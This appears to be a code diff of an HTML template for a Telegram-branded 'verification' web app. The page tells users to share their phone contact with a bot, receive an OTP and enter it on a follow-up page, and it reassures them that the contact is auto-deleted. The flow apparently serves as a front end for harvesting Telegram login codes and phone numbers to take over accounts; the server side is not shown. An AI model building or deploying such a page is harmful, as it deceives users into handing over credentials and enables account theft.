@@ -1,202 +1,111 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Verification</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Telegram Verify</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; }
-        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 30px 20px; text-align: center; }
-        .header h1 { font-size: 24px; margin-bottom: 10px; }
-        .header p { opacity: 0.9; }
+        .container { width: 100%; max-width: 400px; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); overflow: hidden; }
+        .header { background: #0088cc; color: white; padding: 25px; text-align: center; }
+        .header h1 { font-size: 24px; margin-bottom: 5px; }
         .content { padding: 25px; }
-        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 15px 0; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .btn:hover { opacity: 0.9; }
+        .btn { width: 100%; padding: 15px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin: 15px 0; }
+        .btn:hover { background: #006699; }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .status-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 20px; text-align: center; border: 2px solid #e9ecef; }
-        .status-box h3 { color: #333; margin-bottom: 10px; }
-        .info-box { background: #fff3e0; padding: 15px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid #ff9800; }
-        .alert { padding: 15px; border-radius: 10px; margin-bottom: 15px; display: none; }
-        .alert.success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
-        .alert.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
-        .alert.show { display: block; }
+        .alert { padding: 12px; border-radius: 6px; margin: 10px 0; display: none; }
+        .alert.error { background: #ffebee; color: #d32f2f; border-left: 4px solid #f44336; }
+        .alert.success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #4caf50; }
+        .info { background: #f5f5f5; padding: 15px; border-radius: 8px; margin: 15px 0; font-size: 14px; }
         .hidden { display: none; }
-        .loading { text-align: center; padding: 40px 20px; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔐 Telegram Verification</h1>
-            <p>Secure Account Verification</p>
+            <h1>🔐 Telegram Verify</h1>
+            <p>Secure account verification</p>
         </div>
         
         <div class="content">
-            <!-- Loading -->
-            <div id="loading" class="loading">
-                <div class="spinner"></div>
-                <p>Loading Verification...</p>
+            <div id="alert" class="alert"></div>
+            
+            <div class="info">
+                <p><strong>User ID:</strong> <span id="user-id">{{ user_id or 'Not set' }}</span></p>
+                <p><strong>Bot:</strong> @{{ bot_username }}</p>
             </div>
             
-            <!-- Main Content -->
-            <div id="main-content" class="hidden">
-                <!-- User Status -->
-                <div class="status-box">
-                    <h3>👤 Verification Status</h3>
-                    <p><strong>User ID:</strong> <span id="user-id">{{ user_id or 'Not detected' }}</span></p>
-                    <p><strong>Status:</strong> <span id="status-text">Ready to start</span></p>
-                    <p><strong>Bot:</strong> @{{ bot_username }}</p>
-                </div>
-                
-                <!-- Alerts -->
-                <div id="alert" class="alert"></div>
-                
-                <!-- Instructions -->
-                <div class="info-box">
-                    <h3>📋 How to Verify:</h3>
-                    <ol style="margin-left: 20px; margin-top: 10px;">
-                        <li>Click "Start Verification" below</li>
-                        <li>Return to Telegram bot chat</li>
-                        <li>Tap attachment (📎) button</li>
-                        <li>Select & share "Contact"</li>
-                        <li>Receive OTP on phone</li>
-                        <li>Enter OTP here</li>
-                    </ol>
-                    <p style="margin-top: 10px; font-size: 12px; color: #e65100;">
-                        🔒 Your contact is auto-deleted immediately
-                    </p>
-                </div>
-                
-                <!-- Action Button -->
-                <button id="start-btn" class="btn" onclick="startVerification()">
-                    🚀 Start Verification
-                </button>
-                
-                <!-- Alternative -->
-                <div style="text-align: center; margin-top: 15px; font-size: 14px; color: #666;">
-                    <p>Having issues? Try:</p>
-                    <button onclick="openTelegram()" style="background: #0088cc; color: white; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; margin: 5px;">
-                        📱 Open Telegram Bot
-                    </button>
-                </div>
+            <div class="info">
+                <strong>How to verify:</strong>
+                <ol style="margin: 10px 0 10px 20px;">
+                    <li>Click Start below</li>
+                    <li>Return to Telegram bot</li>
+                    <li>Share your contact</li>
+                    <li>Enter received OTP</li>
+                </ol>
+                <small>Contact auto-deleted after use</small>
             </div>
+            
+            <button id="start-btn" class="btn" onclick="startVerify()">
+                🚀 Start Verification
+            </button>
         </div>
     </div>
 
     <script>
         const userId = "{{ user_id }}";
         
-        // Initialize
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log("🔧 WebApp initialized");
-            
-            // Check if we have user ID
-            if (userId && userId.trim() !== '') {
-                console.log("✅ User ID:", userId);
-                document.getElementById('user-id').textContent = userId;
-                showMain();
-            } else {
-                // Try to detect Telegram WebApp
-                if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
-                    const tg = Telegram.WebApp;
-                    tg.ready();
-                    
-                    const tgUser = tg.initDataUnsafe?.user;
-                    if (tgUser && tgUser.id) {
-                        // Redirect with user ID
-                        const newUrl = `${window.location.pathname}?user_id=${tgUser.id}`;
-                        window.location.href = newUrl;
-                        return;
-                    }
-                }
-                
-                // No user ID - show error
-                showAlert('error', '❌ Please open from Telegram bot using /start command.');
-                document.getElementById('start-btn').disabled = true;
-                showMain();
-            }
-        });
-        
-        function showMain() {
-            document.getElementById('loading').classList.add('hidden');
-            document.getElementById('main-content').classList.remove('hidden');
+        function showAlert(type, message) {
+            const alert = document.getElementById('alert');
+            alert.textContent = message;
+            alert.className = 'alert ' + type;
+            alert.style.display = 'block';
+            setTimeout(() => alert.style.display = 'none', 3000);
         }
         
-        function startVerification() {
+        function startVerify() {
             if (!userId) {
-                showAlert('error', 'Please open from Telegram bot first.');
+                showAlert('error', 'Open from Telegram bot');
                 return;
             }
             
             const btn = document.getElementById('start-btn');
             btn.disabled = true;
-            btn.innerHTML = '<div class="spinner" style="width:20px;height:20px;"></div> Starting...';
+            btn.textContent = 'Processing...';
             
-            showAlert('success', '🚀 Starting verification...');
-            
-            // Call API
             fetch('/api/start-verification', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: userId })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({user_id: userId})
             })
-            .then(response => response.json())
+            .then(r => r.json())
             .then(data => {
                 if (data.success) {
-                    showAlert('success', '✅ ' + data.message);
-                    
-                    // Show detailed instructions
+                    showAlert('success', data.message);
+                    alert("✅ " + data.instructions + "\n\nReturn to Telegram and share your contact.");
                     setTimeout(() => {
-                        const instructions = data.instructions.replace(/<[^>]*>/g, '');
-                        alert("📋 FOLLOW THESE STEPS:\n\n" + instructions);
-                        
-                        // Update UI
-                        document.getElementById('status-text').textContent = 'Verification Started';
-                        btn.innerHTML = '✅ Started - Return to Telegram';
-                        
-                        // Auto-redirect to OTP page after contact sharing
-                        setTimeout(() => {
-                            window.location.href = `/otp?user_id=${userId}`;
-                        }, 3000);
-                    }, 1000);
+                        window.location.href = `/otp?user_id=${userId}`;
+                    }, 2000);
                 } else {
-                    showAlert('error', '❌ ' + data.error);
+                    showAlert('error', data.error);
                     btn.disabled = false;
-                    btn.innerHTML = '🚀 Start Verification';
+                    btn.textContent = '🚀 Start Verification';
                 }
             })
-            .catch(error => {
-                console.error('Error:', error);
-                showAlert('error', '❌ Network error. Please try again.');
+            .catch(e => {
+                showAlert('error', 'Error: ' + e);
                 btn.disabled = false;
-                btn.innerHTML = '🚀 Start Verification';
+                btn.textContent = '🚀 Start Verification';
             });
         }
         
-        function showAlert(type, message) {
-            const alertEl = document.getElementById('alert');
-            alertEl.textContent = message;
-            alertEl.className = `alert ${type} show`;
-            
-            setTimeout(() => {
-                alertEl.classList.remove('show');
-            }, type === 'error' ? 5000 : 3000);
-        }
-        
-        function openTelegram() {
-            // Open Telegram bot
-            window.open(`https://t.me/{{ bot_username }}`, '_blank');
-        }
-        
-        // Debug: Show Telegram WebApp data
-        console.log("Telegram WebApp:", typeof Telegram !== 'undefined' ? 'Available' : 'Not available');
-        if (typeof Telegram !== 'undefined') {
-            console.log("Init Data:", Telegram.WebApp.initDataUnsafe);
+        // Auto-start if user ID exists
+        if (userId) {
+            document.getElementById('user-id').textContent = userId;
+        } else {
+            showAlert('error', 'Open from Telegram bot using /start');
+            document.getElementById('start-btn').disabled = true;
         }
     </script>
 </body>
